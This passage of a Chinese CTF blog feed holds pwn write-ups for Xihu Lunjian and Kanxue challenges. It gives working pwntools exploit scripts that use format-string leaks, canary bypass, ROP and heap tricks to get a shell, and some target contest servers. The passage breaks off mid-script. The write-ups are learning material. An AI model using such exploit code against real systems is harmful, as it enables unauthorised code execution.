id="0x3-关闭基地址随机化"><a href="#0x3-关闭基地址随机化" class="headerlink" title="0x3 关闭基地址随机化"></a>0x3 关闭基地址随机化</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><h1 id="0x3-leak-address后门"><a href="#0x3-leak-address后门" class="headerlink" title="0x3 leak address后门"></a>0x3 leak address后门</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> long *addr;</span><br><span class="line">addr=0x601020;</span><br><span class="line">puts(&quot;Your find puts address:&quot;);</span><br><span class="line">printf(&quot;%p\n&quot;,*addr);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      这里介绍一下pwn的一些常规操作，要不然每次还得百度
    
    </summary>
    
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>&#39;西湖论剑&#39;</title>
    <link href="http://yoursite.com/2019/04/07/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/"/>
    <id>http://yoursite.com/2019/04/07/西湖论剑/</id>
    <published>2019-04-07T12:07:29.000Z</published>
    <updated>2019-09-15T07:44:35.310Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-story"><a href="#0x00-story" class="headerlink" title="0x00 story"></a>0x00 story</h1><h2 id="0x00-思路"><a href="#0x00-思路" class="headerlink" title="0x00 思路"></a>0x00 思路</h2><p>这道题目，我一开始思路错了，因为一开始就找到了 <strong>printf(&amp;str)</strong> 漏洞，之后就一直想仅仅用这一个漏洞去getshell，然而并不能，之后仔细的审计，发现有 <strong>stack overflow</strong>  然而有 <strong>canary</strong> 保护，但是没有关系，我们还有一个漏洞，很容易就getshell，在错误的思路上，想了6个小时，之后调试的时候 <strong>one_gadget</strong> 出错了，难受，赛后才做出来</p><h2 id="0x01-遇到的问题"><a href="#0x01-遇到的问题" class="headerlink" title="0x01 遇到的问题"></a>0x01 遇到的问题</h2><h3 id="0x00-64bit-format漏洞"><a href="#0x00-64bit-format漏洞" class="headerlink" title="0x00 64bit format漏洞"></a>0x00 64bit format漏洞</h3><p>printf漏洞不再解释，需要注意的是 <strong>printf遇到’\x00’就会停止输出</strong>，在64bit系统下，我们知道内存的地址都是 <strong>‘0x00’</strong> 开头的，所以，如果你把想要leak的address 放到前面，那么printf将会什么也不会输出，我在这里就卡了好久。。。</p><h3 id="0x01-参数对其问题"><a href="#0x01-参数对其问题" class="headerlink" title="0x01 参数对其问题"></a>0x01 参数对其问题</h3><p>有的时候，你需要字节对齐，比如说，8bit对齐，你可以用 <strong>ljust()</strong> 函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=&apos;&apos;.ljust(num,char)</span><br><span class="line">#num为对齐的字节数</span><br><span class="line"># char为要填充的字符</span><br></pre></td></tr></table></figure></p><h2 id="0x02-exploit"><a href="#0x02-exploit" class="headerlink" title="0x02 exploit"></a>0x02 exploit</h2><p>最后附上自己的exploit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">#r=remote(&apos;ctf1.linkedbyx.com&apos;,10105)</span><br><span class="line">r=process(&apos;./story&apos;)</span><br><span class="line">#r=remote(&apos;127.0.0.1&apos;,8890)</span><br><span class="line">elf=ELF(&apos;./story&apos;)</span><br><span class="line">libc=ELF(&apos;./libc.so&apos;)</span><br><span class="line">cannary=0</span><br><span class="line">free_addr=elf.got[&apos;free&apos;]</span><br><span class="line">def leak():</span><br><span class="line">r.recvuntil(&quot;ID:&quot;)</span><br><span class="line">payload=&apos;&apos;</span><br><span class="line">payload=&apos;&lt;%10$s&gt;&apos;.ljust(8)+&apos;@%15$lxB&apos;.ljust(8)+p64(free_addr)</span><br><span class="line">print payload</span><br><span class="line">r.sendline(payload)</span><br><span class="line">#gdb.attach(r)</span><br><span class="line">data=r.recvuntil(&apos;B&apos;)</span><br><span class="line">print data</span><br><span class="line">address=re.findall(&quot;&lt;(.*)&gt;&quot;,data)</span><br><span class="line">print address</span><br><span class="line">printf_address=address[0][0:6].ljust(8,&apos;\x00&apos;)</span><br><span class="line">print printf_address</span><br><span class="line">global cannary</span><br><span class="line">cannary= int(re.findall(&quot;@(.*)B&quot;,data)[0][-16:-1]+&apos;0&apos;,16)</span><br><span class="line">print type(cannary)</span><br><span class="line">print &apos;printf_address=&apos;+hex(u64(printf_address))</span><br><span class="line">return u64(printf_address)</span><br><span class="line">libc_base=leak()-libc.symbols[&apos;free&apos;]</span><br><span class="line">one_gadget=libc_base+libc.symbols[&apos;system&apos;]</span><br><span class="line">print hex(cannary)</span><br><span class="line">print r.recvuntil(&quot;Tell me the size of your story:&quot;)</span><br><span class="line">r.sendline(&apos;200&apos;)</span><br><span class="line">r.recvuntil(&apos;story:&apos;)</span><br><span class="line">#gdb.attach(r,&apos;b *0x400A52&apos;)</span><br><span class="line">payload=&apos;A&apos;*0x88+p64(int(cannary))+&apos;A&apos;*8+p64(0x400bd3)+p64(libc_base+0x18cd57)+p64(0x400bd1)+&apos;\x00&apos;.ljust(8,&apos;\x00&apos;)+&apos;A&apos;*8+p64(one_gadget)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p><h1 id="0x1-noinfoleak"><a href="#0x1-noinfoleak" class="headerlink" title="0x1 noinfoleak"></a>0x1 noinfoleak</h1><h2 id="0x00-思路-1"><a href="#0x00-思路-1" class="headerlink" title="0x00 思路"></a>0x00 思路</h2><p>uaf漏洞，其实这个漏洞很明显，但是我一直卡在如何 <strong>leak libc address</strong> 最后看学长的exploit的，got表跳plt，这样就可以通过调用free调用put。。。知识盲区，学到了。。。</p><h2 id="0x01-遇到的问题-1"><a href="#0x01-遇到的问题-1" class="headerlink" title="0x01 遇到的问题"></a>0x01 遇到的问题</h2><h3 id="0x00-关于’0x60’和str-0x60-的区别"><a href="#0x00-关于’0x60’和str-0x60-的区别" class="headerlink" title="0x00 关于’0x60’和str(0x60)的区别"></a>0x00 关于’0x60’和str(0x60)的区别</h3><p>之前一直以为这两个是一样，通过这次比赛，我发现了区别</p><p> <strong>sendline(‘0x60’)</strong> 会发送 <strong>‘0x60\n’</strong></p><p> 而 <strong>sendline(str(0x60))</strong> 会发送 <strong>‘96\n’</strong></p><h3 id="0x2-exploit"><a href="#0x2-exploit" class="headerlink" title="0x2 exploit"></a>0x2 exploit</h3><p>追了一下学长的exploit，自己没写就不附了</p><h1 id="0x2-Storm-note"><a href="#0x2-Storm-note" class="headerlink" title="0x2 Storm_note"></a>0x2 Storm_note</h1><h2 id="0x00-思路-2"><a href="#0x00-思路-2" class="headerlink" title="0x00 思路"></a>0x00 思路</h2><p>这个题目的漏洞的 <strong>offset by one</strong> ，要用到unsorted bin 又是知识盲区。。。看了两天，才大概明白writeup的意思</p><p>这道题目和2018年的0ctf中的一道题目很像<br><a href="https://bbs.pediy.com/thread-225973.htm" target="_blank" rel="noopener">ctf pwn中的unsorted bin利用及chunk shrink——0ctf2018 heapstorm2 writeup    </a></p><p>问题好多待总结</p>]]></content>
    
    <summary type="html">
    
      这里总结一下西湖论剑pwn部分，虽然不太 难，但是还是一道题目没有做出来，第一题还是有点思路的，第二题，第三题触碰到了知识盲区。。。。努力学习知识
    
    </summary>
    
    
    
      <category term="ctf,pwn" scheme="http://yoursite.com/tags/ctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>&#39;看雪ctf_candcpp&#39;</title>
    <link href="http://yoursite.com/2019/03/29/%E7%9C%8B%E9%9B%AActf-candcpp/"/>
    <id>http://yoursite.com/2019/03/29/看雪ctf-candcpp/</id>
    <published>2019-03-29T15:33:49.000Z</published>
    <updated>2019-09-15T07:44:35.285Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-考点"><a href="#0x00-考点" class="headerlink" title="0x00 考点"></a>0x00 考点</h1><p>这个题目，主要考察了c的 <strong>malloc()</strong> 函数和c++的 <strong>new</strong> 的区别。<br>详细参考这篇文章</p><p><a href="https://bbs.pediy.com/thread-249883.htm" target="_blank" rel="noopener">[原创]看雪CTF2019Q1题目提交</a></p><h2 id="0x00-chunk结构区别"><a href="#0x00-chunk结构区别" class="headerlink" title="0x00 chunk结构区别"></a>0x00 chunk结构区别</h2><h3 id="0x01-malloc"><a href="#0x01-malloc" class="headerlink" title="0x01 malloc"></a>0x01 malloc</h3><table><thead><tr><th style="text-align:left">pre_size</th><th>size</th></tr></thead><tbody><tr><td style="text-align:left">null</td><td>string</td></tr><tr><td style="text-align:left">string</td><td>null</td></tr></tbody></table><p>…</p><h3 id="0x01-new"><a href="#0x01-new" class="headerlink" title="0x01 new"></a>0x01 new</h3><table><thead><tr><th style="text-align:left">pre_size</th><th style="text-align:left">size</th></tr></thead><tbody><tr><td style="text-align:left">length</td><td style="text-align:left">fun_ptr_addr</td></tr><tr><td style="text-align:left">string</td><td style="text-align:left">string</td></tr><tr><td style="text-align:left">fun_ptr_addr</td><td style="text-align:left">string</td></tr><tr><td style="text-align:left">string</td><td style="text-align:left">fun_ptr_addr</td></tr></tbody></table><p>…</p><h1 id="0x01-解题思路"><a href="#0x01-解题思路" class="headerlink" title="0x01 解题思路"></a>0x01 解题思路</h1><h2 id="0x00-malloc和new的chunk-结构不一样"><a href="#0x00-malloc和new的chunk-结构不一样" class="headerlink" title="0x00 malloc和new的chunk 结构不一样"></a>0x00 malloc和new的chunk 结构不一样</h2><p>如果把malloc的chunk按照new的chunk，delete掉，就会下溢出，如果下面正好有一个new的chunk，就可能实现任意address function执行<br>详细exp参考这篇文章</p><p><a href="https://bbs.pediy.com/thread-250306.htm" target="_blank" rel="noopener">[原创]2019CTF晋级赛Q1第九题CandCpp 分析</a></p><h1 id="0x02-遇到的问题"><a href="#0x02-遇到的问题" class="headerlink" title="0x02 遇到的问题"></a>0x02 遇到的问题</h1><h2 id="0x00-malloc和new过程，string读入问题"><a href="#0x00-malloc和new过程，string读入问题" class="headerlink" title="0x00 malloc和new过程，string读入问题"></a>0x00 malloc和new过程，string读入问题</h2><p>对于这个题目，他是两个字节，两个字节的读入，所以，不能一个sendline结束，需要做一个for 循环输入，最重要的，他一次会读入 <strong>15byte</strong> ，最后一个byte是 <strong>‘\x00’</strong> 所以，我们输入的时候要输入15byte，要不然就会引起错位，这就很头疼了。而且要用 <strong>send</strong>，不能用 <strong>sendline</strong>，这两个用的时候要小心，有的时候，你要用sendline，不然他会一直等待输入，这个还好解决，因为你不能进行下一步，所以，你会换着用，</p><p>但是，有的时候必须要用send，你如果多输入一个byte，就会导致一系列的问题，而且，你还看不出，1byte太小了，根本看不出。</p><p>做了几次，我大概是这样分的，如果是写buf的最好不要用sendline，不然会错位或者破坏内存。</p><h2 id="0x01-关于recvuntil和sendlineafter的使用"><a href="#0x01-关于recvuntil和sendlineafter的使用" class="headerlink" title="0x01 关于recvuntil和sendlineafter的使用"></a>0x01 关于recvuntil和sendlineafter的使用</h2><p>这两个函数都是用来做控制流程的作用，让我们的exploit有序进行，用法<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=process(<span class="string">'./vnl'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'AAAA'</span>,data)</span><br><span class="line">r.recvuntil(<span class="string">'AAAA'</span>)</span><br></pre></td></tr></table></figure></p><p>第一个参数是字串，我之前一直认为字串后面加不加’\n’，无所谓，今天才认识我的错误，如果不加的话，如果，你的接收的数据正好要转成int类型，不加’\n’，就会发生错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ValueError: invalid literal for int() with base 16: &apos;&apos;</span><br></pre></td></tr></table></figure></p><p>百度了半天没有结果，还好想到了</p><h2 id="0x02-关于IDA的使用"><a href="#0x02-关于IDA的使用" class="headerlink" title="0x02 关于IDA的使用"></a>0x02 关于IDA的使用</h2><p>有的时候不能太相信ida，伪代码看不懂，也许反汇编会更清晰。今天就被教育了<br><img src="/2019/03/29/看雪ctf-candcpp/ida_fake.png" alt=""></p><p>伪代码有点问题，完全看不懂<br><img src="/2019/03/29/看雪ctf-candcpp/ida.png" alt=""></p><p>反汇编就很清晰了</p><h2 id="0x03-one-gadget的使用"><a href="#0x03-one-gadget的使用" class="headerlink" title="0x03 one_gadget的使用"></a>0x03 one_gadget的使用</h2><p>今天遇到一个莫名奇妙的问题<br><img src="/2019/03/29/看雪ctf-candcpp/one_gadget.png" alt=""></p><p>然而装了之后</p><p><img src="/2019/03/29/看雪ctf-candcpp/gadget.png" alt=""></p><p>并没有用。。。</p><h4 id="待解决"><a href="#待解决" class="headerlink" title="待解决"></a>待解决</h4><h2 id="0x04-关于函数跳转的问题"><a href="#0x04-关于函数跳转的问题" class="headerlink" title="0x04 关于函数跳转的问题"></a>0x04 关于函数跳转的问题</h2><p><img src="/2019/03/29/看雪ctf-candcpp/main.png" alt=""><br><img src="/2019/03/29/看雪ctf-candcpp/ida_main.png" alt=""><br>理论上跳转这个两个位置都是可以的，但是跳转到 <strong>0x400E10</strong> 就会crash掉</p><p><img src="/2019/03/29/看雪ctf-candcpp/error.png" alt=""></p><p>下一个地址就可以，好奇怪</p><h3 id="待解决-1"><a href="#待解决-1" class="headerlink" title="待解决"></a>待解决</h3><h1 id="0x03-完整exploit"><a href="#0x03-完整exploit" class="headerlink" title="0x03 完整exploit"></a>0x03 完整exploit</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r=remote('154.8.222.144',9999)</span></span><br><span class="line">r=process(<span class="string">'./candcpp'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">name_addr=<span class="number">0x602328</span></span><br><span class="line">leak_addr=<span class="number">0x400E10</span></span><br><span class="line">main=<span class="number">0x4009ce</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(name1)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"Please input your name: "</span>,name1)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(lenth,context)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Please input length of the string\n"</span>,lenth)</span><br><span class="line">r.sendlineafter(<span class="string">"Please input the string"</span>,context)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Please input index of the string"</span>,index)</span><br><span class="line">r.sendlineafter()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(lenth,context)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">        r.sendlineafter(<span class="string">"Please input length of the string"</span>,str(lenth))</span><br><span class="line">        r.recvuntil(<span class="string">"Please input the string"</span>)</span><br><span class="line">size=(<span class="number">0x8888888888888889</span>*(lenth + <span class="number">14</span>) &gt;&gt; <span class="number">64</span>) &gt;&gt; <span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(size<span class="number">-1</span>):</span><br><span class="line">r.send(context[i])</span><br><span class="line"><span class="keyword">print</span> size</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">        r.sendlineafter(<span class="string">"\n"</span>,index)</span><br><span class="line">payload=[<span class="string">"A"</span>*<span class="number">15</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>)]</span><br><span class="line">payload[<span class="number">29</span>]=p64(name_addr+<span class="number">8</span>)+<span class="string">'A'</span>*<span class="number">7</span></span><br><span class="line">payload[<span class="number">30</span>]=p64(name_addr)+<span class="string">'A'</span>*<span class="number">7</span></span><br><span class="line">name(p64(leak_addr)+p64(main))</span><br><span class="line">malloc(<span class="string">"8"</span>,<span class="string">"A"</span>*<span class="number">8</span>)</span><br><span class="line">new(<span class="number">0x300</span>,payload)</span><br><span class="line">r.sendline(<span class="string">"0"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r,"b *0x400D90")</span></span><br><span class="line">delete(<span class="string">"0"</span>)</span><br><span class="line">put_addr=r.recv(<span class="number">14</span>)</span><br><span class="line"><span class="keyword">print</span> put_addr</span><br><span class="line">onegadget=<span class="number">0x4526a</span>+int(put_addr,<span class="number">16</span>)-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> onegadget</span><br><span class="line">r.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">r.sendline(p64(onegadget))</span><br><span class="line">delete(<span class="string">"0"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      这里总结一下，candapp遇到的问题
    
    </summary>
    
    
    
      <category term="ctf,pwn" scheme="http://yoursite.com/tags/ctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>&#39;2019看雪ctf&#39;</title>
    <link href="http://yoursite.com/2019/03/25/2019%E7%9C%8B%E9%9B%AActf/"/>
    <id>http://yoursite.com/2019/03/25/2019看雪ctf/</id>
    <published>2019-03-25T13:30:20.000Z</published>
    <updated>2019-09-15T07:44:35.193Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>首先checksec()<br><img src="/2019/03/25/2019看雪ctf/checksec.png" alt=""></p><p> 保护全开。。。难受</p><h1 id="0x01-漏洞点"><a href="#0x01-漏洞点" class="headerlink" title="0x01 漏洞点"></a>0x01 漏洞点</h1><p> 漏洞点不再赘述，参考这两位大佬的wp</p><p> <a href="https://bbs.pediy.com/thread-249985.htm" target="_blank" rel="noopener">[原创]2019CTF晋级赛Q1第四题单身狗分析</a></p><p> <a href="https://bbs.pediy.com/thread-250319.htm" target="_blank" rel="noopener">[原创]第四题 拯救单身狗</a></p><h1 id="0x02-遇到的问题"><a href="#0x02-遇到的问题" class="headerlink" title="0x02 遇到的问题"></a>0x02 遇到的问题</h1><h2 id="0x00-leak-address"><a href="#0x00-leak-address" class="headerlink" title="0x00 leak address"></a>0x00 leak address</h2><p>本来这是个很简单的事情，然而，一个习惯浪费我三个小时</p><p> 首先看现象</p><p> 预期现象<br> <img src="/2019/03/25/2019看雪ctf/leak_addr_right.jpg" alt=""><br> 实际现象<br> <img src="/2019/03/25/2019看雪ctf/leak_addr.jpg" alt=""></p><p>好吧这是什么原因，再来看源代码<br><img src="/2019/03/25/2019看雪ctf/code.jpg" alt=""></p><p>左边为正解,右边就会出错，为什么会这样呢</p><p>经过我3个小时的细致观察，发现 <strong>sendline()</strong> 函数多发送了一个’\n’，本来8byte正好覆盖stderr结构的flag位置，现在多了一个字节，看看ida<br><img src="/2019/03/25/2019看雪ctf/ida.png" alt=""></p><p>多了一个byte应该把 <strong>completed_6962</strong> 写坏了，所以导致错误，应该是sendline导致的错误</p><h2 id="0x01-search-libc"><a href="#0x01-search-libc" class="headerlink" title="0x01 search libc"></a>0x01 search libc</h2><p>我用的是libc-db</p><p>预期结果</p><p><img src="/2019/03/25/2019看雪ctf/libc_right.png" alt=""><br>实际情况</p><p><img src="/2019/03/25/2019看雪ctf/libc.png" alt=""><br>我的没有libc2.27amd64.。。。</p><p>原因我也不知道等待大佬解答</p><h2 id="0x02-one-gadget用法"><a href="#0x02-one-gadget用法" class="headerlink" title="0x02 one_gadget用法"></a>0x02 one_gadget用法</h2><p>还是去补了一下one_gadget的用法<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">one_gadget</span><span class="params">(filename)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> map(int, subprocess.check_output([<span class="string">'one_gadget'</span>, <span class="string">'--raw'</span>, filename]).split(<span class="string">' '</span>))</span><br><span class="line"></span><br><span class="line">one_gadget(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#=&gt; [324293, 324386, 1090444]</span></span><br></pre></td></tr></table></figure></p><p>放在这里以免忘了</p><h2 id="0x03-pwntool用gdb"><a href="#0x03-pwntool用gdb" class="headerlink" title="0x03 pwntool用gdb"></a>0x03 pwntool用gdb</h2><p>用完之后发现真的方便<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./pwn'</span>)</span><br><span class="line">gdb.attach(p)</span><br></pre></td></tr></table></figure></p><p>这样写就可以快乐的打开gdb了</p><h2 id="0x04-get-symbols"><a href="#0x04-get-symbols" class="headerlink" title="0x04 get symbols"></a>0x04 get symbols</h2><p>之前一直用 <strong>objdump -d ./libc.so</strong> 来查offset，今天终于翻车了，之后发现用 <strong>readelf -s ./libc.so |grep xxxx</strong> 才是正道，也可以用 <strong>pwntools</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc=ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line">libc.symbols[<span class="string">'xxxxx'</span>]</span><br></pre></td></tr></table></figure><h1 id="0x03-exploit-py"><a href="#0x03-exploit-py" class="headerlink" title="0x03 exploit.py"></a>0x03 exploit.py</h1><p>最后附上自己的expliot.py,虽然和大佬们的非常像，但是，自己也学到了好多东西<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="comment">#r=remote('127.0.0.1',8888)</span></span><br><span class="line">r=remote(<span class="string">"211.159.175.39"</span>,<span class="number">8686</span>)</span><br><span class="line"><span class="comment">#r=process('./apwn')</span></span><br><span class="line">libc=ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_sling</span><span class="params">(name)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;&gt;\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">    r.sendafter(<span class="string">"Name:\n"</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_lucy</span><span class="params">(name1,name2)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;&gt;\n"</span>,<span class="string">"2"</span>)</span><br><span class="line">    r.sendafter(<span class="string">"Name\n"</span>,name1)</span><br><span class="line">    r.sendafter(<span class="string">"name\n"</span>,name2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_sling</span><span class="params">(index,name)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;&gt;\n"</span>,<span class="string">"3"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"?"</span>,index)</span><br><span class="line">    r.sendafter(<span class="string">"\n"</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_lucy</span><span class="params">(index,name1,name2)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;&gt;\n"</span>,<span class="string">"4"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"?\n"</span>,index)</span><br><span class="line">    r.sendafter(<span class="string">"?"</span>,name1)</span><br><span class="line">    r.sendafter(<span class="string">"\n"</span>,name2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_dog</span><span class="params">()</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"&gt;&gt;\n"</span>,<span class="string">"5"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">one_gadget</span><span class="params">(filename)</span>:</span></span><br><span class="line"><span class="keyword">return</span> map(int, subprocess.check_output([<span class="string">'one_gadget'</span>, <span class="string">'--raw'</span>, filename]).split(<span class="string">' '</span>))</span><br><span class="line">edit_sling(<span class="string">"-4"</span>,<span class="string">"1"</span>*<span class="number">8</span>)</span><br><span class="line">r.recvuntil(<span class="string">"1"</span>*<span class="number">8</span>)</span><br><span class="line">libc_base=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="number">-131</span><span class="number">-0x3ec680</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">one_gadget_addr=one_gadget(<span class="string">'./libc.so'</span>)</span><br><span class="line">gadget=one_gadget(<span 